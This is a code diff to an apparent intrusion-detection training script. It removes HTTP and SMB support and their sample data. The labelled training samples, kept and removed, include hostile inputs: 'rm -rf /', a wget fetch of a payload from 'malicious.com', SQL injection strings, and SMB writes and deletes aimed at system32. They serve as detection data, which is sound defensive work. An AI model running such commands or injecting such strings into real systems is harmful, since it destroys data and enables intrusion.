@@ -36,7 +36,7 @@ class ComprehensiveTrainer:
     def __init__(self, datasets_dir: str = "datasets"):
         self.datasets_dir = Path(datasets_dir)
         self.data_processor = DataProcessor(str(self.datasets_dir))
-        self.services = ['ssh', 'http', 'ftp', 'mysql', 'smb']
+        self.services = ['ssh', 'ftp', 'mysql']
         self.results = {}
         
         # Ensure models directory exists
@@ -255,11 +255,6 @@ class ComprehensiveTrainer:
                 {'command': 'rm -rf /', 'label': 'malicious'},
                 {'command': 'wget http://malicious.com/payload.sh', 'label': 'malicious'}
             ],
-            'http': [
-                {'request': 'GET /index.html', 'method': 'GET', 'url': '/index.html', 'label': 'normal'},
-                {'request': 'GET /admin/config.php', 'method': 'GET', 'url': '/admin/config.php', 'label': 'malicious'},
-                {'request': "GET /?id=1' OR 1=1--", 'method': 'GET', 'url': "/?id=1' OR 1=1--", 'label': 'malicious'}
-            ],
             'mysql': [
                 {'query': 'SELECT * FROM users WHERE id = 1', 'label': 'normal'},
                 {'query': "SELECT * FROM users WHERE id = 1' OR 1=1--", 'label': 'malicious'},
@@ -270,11 +265,6 @@ class ComprehensiveTrainer:
                 {'command': 'RETR', 'filename': 'document.txt', 'label': 'normal'},
                 {'command': 'STOR', 'filename': 'malware.exe', 'label': 'malicious'}
             ],
-            'smb': [
-                {'command': 'READ', 'path': '\\\\server\\share\\file.txt', 'label': 'normal'},
-                {'command': 'WRITE', 'path': '\\\\server\\admin$\\system32\\malware.exe', 'label': 'malicious'},
-                {'command': 'DELETE', 'path': '\\\\server\\c$\\windows\\system32\\', 'label': 'malicious'}
-            ]
         }
         
         for service in self.services:
@@ -313,7 +303,7 @@ class ComprehensiveTrainer:
 def main():
     parser = argparse.ArgumentParser(description='NEXUS AI Model Training Pipeline')
     parser.add_argument('--datasets-dir', default='datasets', help='Datasets directory path')
-    parser.add_argument('--services', nargs='+', choices=['ssh', 'http', 'ftp', 'mysql', 'smb', 'all'], 
+    parser.add_argument('--services', nargs='+', choices=['ssh', 'ftp', 'mysql', 'all'], 
                        default=['all'], help='Services to train models for')
     parser.add_argument('--algorithms', nargs='+', 
                        choices=['isolation_forest', 'one_class_svm', 'lof', 'hdbscan', 'kmeans', 'xgboost', 'all'],
@@ -328,7 +318,7 @@ def main():
     
     # Resolve services
     if 'all' in args.services:
-        services = ['ssh', 'http', 'ftp', 'mysql', 'smb']
+        services = ['ssh', 'ftp', 'mysql']
     else:
         services = args.services
     
